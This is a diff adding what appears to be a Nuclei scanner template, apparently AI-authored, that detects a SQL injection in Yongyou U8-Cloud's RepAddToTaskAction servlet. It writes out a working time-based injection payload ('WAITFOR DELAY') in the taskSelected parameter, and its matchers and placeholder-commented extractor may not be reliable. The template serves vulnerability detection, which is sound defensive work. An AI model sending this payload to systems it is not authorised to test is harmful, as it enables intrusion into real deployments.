@@ -1,0 +1,54 @@
+id: yongyou-u8-cloud-repaddtotaskaction-sqli
+info:
+  name: Yongyou U8-Cloud RepAddToTaskAction SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: Yongyou U8cloud
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "U8C"
+      - type: status
+        status:
+          - 200
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "正在执行... - iUFO"
+          - "系统正在处理请求"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: response-delay
+        group: 0
+        regex:
+          - "正在执行.*"  # Example regex to extract matching content from response body.
